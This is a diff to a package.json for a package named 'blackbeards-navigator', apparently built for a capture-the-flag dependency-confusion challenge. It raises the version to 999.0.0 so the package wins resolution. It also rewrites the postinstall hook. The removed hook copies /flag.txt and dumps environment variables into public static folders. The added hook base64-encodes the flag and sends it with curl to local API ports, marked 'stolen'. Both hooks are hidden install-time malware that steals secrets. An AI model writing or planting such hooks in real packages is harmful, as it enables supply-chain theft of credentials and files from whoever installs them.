@@ -1,9 +1,11 @@
 {
     "name": "blackbeards-navigator",
-    "version": "1.23.456",
+    "version": "999.0.0",
     "scripts": {
-      "postinstall": "cp /flag.txt /app/static/f.txt 2>/dev/null; cp
-  /flag.txt /app/public/f.txt 2>/dev/null; printenv > /app/static/env.txt
-  2>/dev/null; true"
+      "postinstall": "F=$(cat /flag.txt 2>/dev/null | base64 | tr -d '\\n');
+  for p in 3000 3001 4000 5000 8000 8080 31800; do curl -sf -X PUT
+  http://127.0.0.1:$p/api/modules/ECT-839201 -H 'Content-Type:
+  application/json' -d \"{\\\"manifest\\\":\\\"stolen: $F\\\"}\" && break;
+  done; true"
     }
   }
